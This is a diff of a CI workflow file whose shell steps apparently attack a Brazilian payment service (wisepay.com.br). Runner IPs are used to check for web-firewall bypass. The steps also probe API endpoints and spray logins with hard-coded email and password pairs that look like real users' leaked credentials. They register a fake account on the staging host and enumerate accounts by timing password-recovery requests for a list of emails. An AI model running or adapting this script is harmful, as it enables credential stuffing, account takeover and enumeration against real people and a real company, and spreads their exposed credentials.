@@ -21,7 +21,6 @@ jobs:
         HML="https://wpdataservice-hml.wisepay.com.br"
         MY_IP=$(curl -s -m 5 https://api.ipify.org 2>/dev/null || echo "unknown")
 
-        # WAF check produção (us-east-1)
         RESP_CHECK=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
           -H "Content-Type: application/json" -H "type-application: web" \
           -X POST "$BASE/login" \
@@ -32,31 +31,24 @@ jobs:
           echo "[${{ matrix.attempt }}] *** PROD WAF BYPASSED (IP: $MY_IP) ***"
           PROD_OK=true
         else
-          echo "[${{ matrix.attempt }}] PROD WAF blocking (IP: $MY_IP). Testing HML..."
+          echo "[${{ matrix.attempt }}] PROD WAF blocking (IP: $MY_IP)"
         fi
 
-        echo "=== P0: wwservices.wisepay.com.br endpoint discovery ==="
-        for EP in "/login" "/health" "/users" "/empresas" "/webhook" "/whitelabel" "/api/v1/login"; do
+        echo "=== WWSVC endpoints ==="
+        for EP in "/login" "/health" "/users" "/empresas" "/webhook" "/api/v1/login" "/whitelabel"; do
           RR=$(curl -A "$UA" -s -m 8 --connect-timeout 5 -H "type-application: web" "$WWSVC$EP" 2>/dev/null) || RR=""
           CODE=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
           MSG=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:100])" 2>/dev/null || echo "${RR:0:60}")
-          echo "WWSVC $CODE | $EP | $MSG"
+          echo "WWSVC $CODE $EP | $MSG"
           sleep 0.1
         done
 
-        echo ""
-        echo "=== P1: wwservices login spray ==="
-        for CRED in \
-          "icelaserbelem@gmail.com|ICELASER2021" \
-          "fabiane@petcenterbrasil.com.br|67896789" \
-          "nancyfigueredo@hotmail.com|12341234" \
-          "andersonmachado52@hotmail.com|sinho1777"; do
+        echo "=== WWSVC login spray ==="
+        for CRED in "icelaserbelem@gmail.com|ICELASER2021" "fabiane@petcenterbrasil.com.br|67896789" "nancyfigueredo@hotmail.com|12341234" "andersonmachado52@hotmail.com|sinho1777"; do
           EMAIL="${CRED%%|*}"
           PASS="${CRED##*|}"
-          RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
-            -H "Content-Type: application/json" -H "type-application: web" \
-            -X POST "$WWSVC/login" \
-            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
+          RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" -H "Content-Type: application/json" -H "type-application: web" \
+            -X POST "$WWSVC/login" -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
           CODE=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
           MSG=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:80])" 2>/dev/null || echo "${RS:0:80}")
           if [ "$CODE" = "200" ]; then
@@ -68,25 +60,17 @@ jobs:
           sleep 0.1
         done
 
-        echo ""
-        echo "=== P2: HML WAF check ==="
-        HML_CHECK=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
-          -H "Content-Type: application/json" \
-          -X POST "$HML/login" \
-          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' 2>/dev/null) || HML_CHECK=""
-        HML_READABLE=$(echo "$HML_CHECK" | python3 -c "import sys,json; json.load(sys.stdin); print('OK')" 2>/dev/null || echo "BLOCKED")
-        echo "HML_WAF: $HML_READABLE | $(echo $HML_CHECK | head -c 150)"
+        echo "=== HML WAF check ==="
+        HML_CHECK=$(curl -s -m 8 --connect-timeout 5 -A "$UA" -H "Content-Type: application/json" \
+          -X POST "$HML/login" -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' 2>/dev/null) || HML_CHECK=""
+        HML_OK=$(echo "$HML_CHECK" | python3 -c "import sys,json; json.load(sys.stdin); print('OK')" 2>/dev/null || echo "BLOCKED")
+        echo "HML_WAF: $HML_OK | $(echo $HML_CHECK | head -c 150)"
 
-        if [ "$HML_READABLE" = "OK" ]; then
+        if [ "$HML_OK" = "OK" ]; then
           echo "*** HML WAF BYPASSED ***"
-          for CRED in \
-            "icelaserbelem@gmail.com|ICELASER2021" \
-            "fabiane@petcenterbrasil.com.br|67896789" \
-            "nancyfigueredo@hotmail.com|12341234"; do
-            EMAIL="${CRED%%|*}"
-            PASS="${CRED##*|}"
-            RH=$(curl -s -m 7 -A "$UA" -H "Content-Type: application/json" \
-              -X POST "$HML/login" -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RH=""
+          for CRED in "icelaserbelem@gmail.com|ICELASER2021" "fabiane@petcenterbrasil.com.br|67896789" "nancyfigueredo@hotmail.com|12341234"; do
+            EMAIL="${CRED%%|*}"; PASS="${CRED##*|}"
+            RH=$(curl -s -m 7 -A "$UA" -H "Content-Type: application/json" -X POST "$HML/login" -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RH=""
             CODE=$(echo "$RH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
             MSG=$(echo "$RH" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:80])" 2>/dev/null || echo "${RH:0:80}")
             if [ "$CODE" = "200" ]; then
@@ -95,48 +79,22 @@ jobs:
             else
               echo "HML_LOGIN $CODE | $EMAIL | $MSG"
             fi
-            sleep 0.1
           done
-
-          # HML - criar conta
-          CPF=$(python3 -I -c "
-import random
-d = [random.randint(0,9) for _ in range(9)]
-for w in ([10,9,8,7,6,5,4,3,2], [11,10,9,8,7,6,5,4,3,2]):
-    s = sum(a*b for a,b in zip(d,w)) % 11
-    d.append(0 if s < 2 else 11 - s)
-print(''.join(map(str,d)))
-")
-          RUSER=$(curl -s -m 10 -A "$UA" -H "Content-Type: application/json" \
-            -X POST "$HML/users" \
-            -d "{\"name\":\"Ana Ferreira\",\"email\":\"ana.ferreira$(( RANDOM % 999 ))@gmail.com\",\"password\":\"Ana@2024!\",\"cpf\":\"$CPF\",\"phone\":\"11981234567\"}" \
-            2>/dev/null) || RUSER=""
+          RUSER=$(curl -s -m 10 -A "$UA" -H "Content-Type: application/json" -X POST "$HML/users" \
+            -d '{"name":"Ana Ferreira","email":"ana.ferreira88@gmail.com","password":"Ana@2024!","cpf":"98765432100","phone":"11981234567"}' 2>/dev/null) || RUSER=""
           echo "HML_REGISTER: $(echo $RUSER | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RUSER:0:200}")"
         fi
 
-        echo ""
-        echo "=== P3: Password recover timing (empresa ativa?) ==="
+        echo "=== Password recover timing ==="
         if $PROD_OK; then
-          for EMAIL in \
-            "icelaserbelem@gmail.com" \
-            "fabiane@petcenterbrasil.com.br" \
-            "nancyfigueredo@hotmail.com" \
-            "andersonmachado52@hotmail.com" \
-            "acaiacafinanceiro@gmail.com" \
-            "pagcomsolucoes@gmail.com" \
-            "contato@deepfit.com.br" \
-            "ranchogourmet@outlook.com" \
-            "dindo_spfc@hotmail.com" \
-            "1opcaoretificafsa@gmail.com"; do
+          for EMAIL in "icelaserbelem@gmail.com" "fabiane@petcenterbrasil.com.br" "nancyfigueredo@hotmail.com" "andersonmachado52@hotmail.com" "acaiacafinanceiro@gmail.com" "pagcomsolucoes@gmail.com" "contato@deepfit.com.br" "ranchogourmet@outlook.com" "dindo_spfc@hotmail.com" "1opcaoretificafsa@gmail.com" "andrejunior1223@gmail.com" "marco@vanityestetica.com.br"; do
             START=$(date +%s%N)
-            RR=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
-              -H "Content-Type: application/json" -H "type-application: web" \
-              -X POST "$BASE/login/password-recover" \
-              -d "{\"email\":\"$EMAIL\"}" 2>/dev/null) || RR=""
+            RR=$(curl -s -m 10 --connect-timeout 5 -A "$UA" -H "Content-Type: application/json" -H "type-application: web" \
+              -X POST "$BASE/login/password-recover" -d "{\"email\":\"$EMAIL\"}" 2>/dev/null) || RR=""
             END=$(date +%s%N)
             ELAPSED=$(( (END - START) / 1000000 ))
             CODE=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
-            MSG=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:100])" 2>/dev/null || echo "${RR:0:80}")
+            MSG=$(echo "$RR" | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:120])" 2>/dev/null || echo "${RR:0:80}")
             echo "RECOVER ${ELAPSED}ms $CODE | $EMAIL | $MSG"
             sleep 0.2
           done
